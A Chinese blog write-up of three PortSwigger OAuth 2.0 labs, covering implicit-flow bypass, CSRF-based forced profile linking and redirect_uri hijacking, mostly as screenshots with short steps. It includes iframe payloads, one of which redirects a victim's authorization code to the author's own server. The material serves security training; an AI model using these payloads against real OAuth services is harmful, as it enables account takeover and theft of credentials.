---
title: OAuth 2.0 身份验证漏洞--portswigger打靶
url: https://mp.weixin.qq.com/s/icBvY0qLBvHyrRncG_6ubw
source: Doonsec's feed
date: 2026-06-28
fetch_date: 2026-06-29T06:32:48.707046
---

# OAuth 2.0 身份验证漏洞--portswigger打靶

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/QANKBxjqsn2sXxFqEHElbLqK6cLphm33hsPIIaL34FqDdh0UDt5Mj8IMFC4sctOlrFBvlrVbyDqePqn93ibUwjq4jugiaEL09JljhzBYZSHQ8/0?wx_fmt=jpeg)

# OAuth 2.0 身份验证漏洞--portswigger打靶

原创

小凡
小凡

小凡安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 通过 OAuth 隐式流程绕过身份验证

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn2wicFl8coVvCD4PKwT8qSXN2KfVHCZ6oKp96pRCdUtPZvbNYERibZHibAqoVuQu4DU0qDlSAq0RtXvvD47YXGHP79sDtC0eliaVoE/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn2gEiaEjoa1x5NicibicFGd9wbOdbGBbhxxNibibQDhlkkn8DBA4SfQxFXtLg5gb1bbgNTwGELrJL3iaSIId6jk5eRtdYaSu7I7yyMr9Y/640?wx_fmt=png&from=appmsg)

授权登录抓包

获取其中这个包

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn2Y6UiaVE9nVibOYUD7HK8wosEGqsetELkqnMybnzuSOgo5dF8KXbrw1NjMMqa9LrIaTa2hKYMcP3I1Eia35Y70u4OKIEWbLfgx1E/640?wx_fmt=png&from=appmsg)

修改email看是否报错

修改没有报错

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn19VJ5TzM7gzxh6Z7tTPibeibqbp0yhiaNB91SMdckVlXAINWO8y5qjicvoooMXaIRq75dNx7oay59y5EewWNdxXWquSZftIS4ApFQ/640?wx_fmt=png&from=appmsg)

当前网站退出登录

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn3qHrlzglcLnMTibx2JW4fMiaGqb7rYvgEgxSISeh50l45B1PqskllO20ePJHELLBZIpwdibEDgABjZKE3Pz9XrbnRy28GOZnDnO4/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn1N5S5XzWHJAgqcn85OFuhW1s2Dh07MsaAUaep7kk2Yic84ckvUM1TlM9f21RibpbN9vHZo5EukDCPP1uEsaquGw5Qy4E69osd7M/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn3Z2FF3FcbLfFVicCXB5R4pAXDmJ5JiarSIKaFvibWpoF8vXU2OMgQ3ycMevZul0MpceeWUqsfQiao1iaX9K9clWCwRbiayZIhLTM7icQ/640?wx_fmt=png&from=appmsg)

在浏览器打开

登录carlos成功，通关

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn1QONDpqwjiaPvibzfETl8m4XCAYR5t9Lnw3nLuNJp7drSnTvymvGs3ST6KcVZwY5cTvHkNfmUQJYJBBosicEahVSC0l397D43Hy0/640?wx_fmt=png&from=appmsg)

# 强制 OAuth 配置文件关联

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0bdFHMEJhOvdBnf6yibEWxkJ54affSpDs3cI2r8ONSHibCZLjYrnS3FPpDrtelKAaYdVgGgSKxkafEB9m0STLfp27mfhy21q2xE/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn3lgVZ6uTeiaCa9c0KWsYYljzr0zwl6lLeOiapMhREkkicGkh77ugJmXVZRaw8k5pHOS3KLrOoalKutCbvQh5gKMX1TxdB4YibE7iaQ/640?wx_fmt=png&from=appmsg)

登录

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn248ibAyXumOgaHkY5wia6Hb6B541hf7jOq4MgrFgvPIYazKdoNdltJ04icibwjiauMWiak7TialGytSkVc4njibt2JZa2AMicDvYpDf9Po/640?wx_fmt=png&from=appmsg)

观察页面可以使用社交媒体绑定登录，先使用博客账密登录

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn01uWceC6yGucQXS6d51j8gflibjgmdiaCUpMWz4hGdiaHlDNVqBH8WWhAyAj9FwMLfrCoYlmXkiaXK21DRE0QQPLsQ22MYG738Avw/640?wx_fmt=png&from=appmsg)

绑定社交媒体

在授权绑定的时候进行拦截

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn0MoAo0zjjicWNk35WOzyUaYTpuGicpsNkB7Ew3H5qKBicYQum7Nb51kzhVTp6cwyrCIRMkADJXWuIic30TQhRrerN7CUbnk5ho9rA/640?wx_fmt=png&from=appmsg)

获取code的包丢弃，如果直接发送，账号直接绑定

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn05VWxj0zKzqM9Of4HqyGEib0HQmsibHahQZS738ML8QZPvWUmMcNVWqJLgT37GbrSYISvB2VTjp2mIfxvHozXZY2Dqic7GdEibibq8/640?wx_fmt=png&from=appmsg)

在上面这个包可以看见里面没有state说明可以csrf

将刚丢弃的包的url复制，并封装在iframe中

```
<iframe src="https://0afe00ec04343a8180e1e460008e0064.web-security-academy.net/oauth-linking?code=vpYTZJSr1tmNeuMszyigUY9YgY4-VQ6N9t5xgdG1Ktx"></iframe>
```

使用漏洞利用服务器，保存并发送给受害者

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn1WLDmd6olv6aXicle2JzrFQzQLdh99KfJ1x9uLDdDxP5Hwdm0ZLDxj8sTecMKnkyFevxkPf0Tyv8CRRNyoYTLViajbax0QLS5V4/640?wx_fmt=png&from=appmsg)

这时候社交媒体就绑定了网站管理员的账号

使用社交媒体登录

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0nwky6ObvSCZWXwLHny7obgjOc4sJpB7Rz5tU2gicNgGQHhaj125XcZiciaSanpSbK4df3tDcWQ5URS3l5Cpaee4UUSZ2BgNKYj8/640?wx_fmt=png&from=appmsg)

管理员比普通用户多一个admin panel

删除管理员，通关

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0nOU50GiczbeCeHYItIrmaphicxY9p4l766eEpv793bzKE9YncYKuKicvplbyXEZczI8icHibMicREE6k3ON48C5L6IVJYpLNJZf8LE/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn3BiaIAuCGwJ6kbLwiaY7S3AYL1r6efwIscngxWekSTRSAXLyB4ibeQCDhFq5TiaSbBiak3eXmze0RMeB640qqPMX86JPE0Ob4EboFU/640?wx_fmt=png&from=appmsg)

# 通过 redirect\_uri 劫持 OAuth 帐户

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn3JGibTdNhRpWLnWgb90gicfn8M2Q9WTOhuj178iaPEC7ldSggtNJtQzbjJTYmsIeptKswmx0wYaQN82szWfkDqapzLvB35cdUCo8/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn3QpnicTzUVOmw9Vsy2Ee7L6C1bBt9FxgF6TagKp27tz8nAOXGiaJQeAbXOQleTkic3hyVuJiceyGq0u5Qk0q1QJMTYgDRQiavC8Exw/640?wx_fmt=png&from=appmsg)

使用社交媒体先登录

抓包

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn3wiaPL3HMSrHE2jyYqO0KMt5INicTdiaHBngVVlZokjM7VAiavmcpKEaVw6OAv7zXw9GdTiaO5F8QRfOzXk6rJicjUdMzdzeNKY3vHM/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn1diaoE1gL06iaHK6aJwUXoEDYiahEKDsg1b2DV4zljaPcszLwwibMiajaBzicLbHKYPMzABiaTOYltvD8ejUNAlKO25Oib22YLTLWxMtg/640?wx_fmt=png&from=appmsg)

分析上面两个包

第一个包发包会被重定向到redirect\_uri，然后返回code

第二个包使用code授权登录

修改redirect\_uri并不会报错说明这里并没有校验

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn0wsSh7tF2dbJhX9iaBnJVMJw1nIicoRJR5uKwCyS9eBPUPpnibD59wDzaejlfk5fogLukdE2TQBVUnYB3XzgpPtynhM48QtHX1Oo/640?wx_fmt=png&from=appmsg)

换成baidu.com

```
https://oauth-0a8f0045046d176f8173ffbc02c900f3.oauth-server.net/auth?client_id=aqprtq5t2y6lhjlevbg54&redirect_uri=https://www.baidu.com&response_type=code&scope=openid%20profile%20email
```

浏览器访问发现code被百度带出

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn3N7SqQroERJzxVMJA675jXBLOuBHfpqqIH9By0N9e3Td8pr8czR4pibCNZHGQib8a3lRTWhzu8uEB8CFPldmCGPU2Ob0BFiaWFzc/640?wx_fmt=png&from=appmsg)

将redirect\_uri换成自己的vps进行，打开另一个浏览器进行访问

授权

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn3IVGndbNY2g9b4NFwSOyP6b52gcQPL87M1KTkPqhFSH9uT5zzNibWeJT1zoBW4rHa8d6ON3icH2oAjWnCWSljStVtdjiaJnjSTXU/640?wx_fmt=png&from=appmsg)

跳转到我们自己的vps

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0NjguMSd0lZt2xQINyh2nPVY0AzkvxhxHNrmZMzFbKkzAsMv1Xb7UCdfIwibP2Jt1sgK1vGyCJbSYxz0EnwwicibKHvrRnTXHNkM/640?wx_fmt=png&from=appmsg)

并在日志中可以获取code

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn1OVfKpwQMbhZ6ZTRhzlEajWFIjkUQ88ic8JcG5O5JTmGN8VBaMSlc7iclzPhu3Yvw9SzYrGFyib7wSUQJgjVLVe2DkPugrHZ3VOI/640?wx_fmt=png&from=appmsg)

将上述条件的url放在iframe中

```
<iframe src="https://oauth-0a8f0045046d176f8173ffbc02c900f3.oauth-server.net/auth?client_id=aqprtq5t2y6lhjlevbg54&redirect_uri=http://yi.xiaaaaain.asia&response_type=code&scope=openid%20profile%20email"></iframe>
```

在vps上创建1.html，将代码放入

用户只要和OAuth 服务保持活动会话访问vps的1.html

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn3aolrobNlibJL3ibKADRAzVj7EB35z1Xdicd7cyooKTViaiaQuhpX1v4iclic095hvCZgd4c8WQgtyzHGQEyPFTUnnWCbhUO2nJRHQ9M/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0QMdkqVwFUIh2fnQ061LU1NnlmibzMRewDjuG86mKYR6FO8xrWCmyrv1zUaqPa447BfP7QtvoCIaHDwfO4dG22fQKcGWMrH63s/640?wx_fmt=png&from=appmsg)

就能获取code

将iframe代码放入攻击服务器

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn1vdhFABzXibqYHHiaWOzWxJ41R4GlWQDFOO1HOnQaSzFGK54EnoCBSPaM5icgOzbcva890520dQzDsj5LVmwTSpofSEB9kMqmKl8/640?wx_fmt=png&from=appmsg)

保存发送获取网站管理员的code

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn0z0jZvCaYhKqSFpFZFJkgE1R2T03xm113FwiadZwHj2sibjNewAOkXjQXia3WHe4FkAdKb1iasEoLZYFRtv5nicvQv3iaKzQZSdL4Ow/640?wx_fmt=png&from=appmsg)

使用code登录

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn1cG5zXiaZbOtejYRWuib3Y062epPicwnyz0J2SxCibwxHzmIP5vgcBfWibicAbxChjylPy1D3P8V2aKmj6dTdmOEP2oOUHLvHDIdvPo/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn3lgoPLOLOQROwLZXnM36YEBqiaxBTLH24gB0YhnQgCLdfs1k3XUwV6y2uyPteXOAP4qC6hE6pQr067fxorj45KRU5BcvP1Dl9s/640?wx_fmt=png&from=appmsg)

动作一定要快一会code过期了

查看身份

![](https://mmbiz.qpic.cn/mmbiz_png/QANKBxjqsn1rwUEGUypqSsicrAeCn06n3CnHFINyIeXiazZdAJUhicleoqjptBDjNqjibzQoDChEee9icVD7dlWgM2SnkY8U4uib2Z6TMlx227ll8/640?wx_fmt=png&from=appmsg)

删除carlos，通关

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn2icH5xicAvmZPVBIic1tyUqIfMXbaTqFsXRm7Chra93qo3UF9A5QDdjs3PicQoqbcaaNsicDnfiaR2Lsk9ovW2BNskdZibWyibcaQOQos/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QANKBxjqsn0wMhSWZ16RM01jvEAOC4U0EGeNRHomcwmXXN4j9Q0p5y17IicZxGxcbyLOrMh4e3z7AeNicRqS53s1KBeXxzibJ30NicRENK4JYicE/640?wx_fm...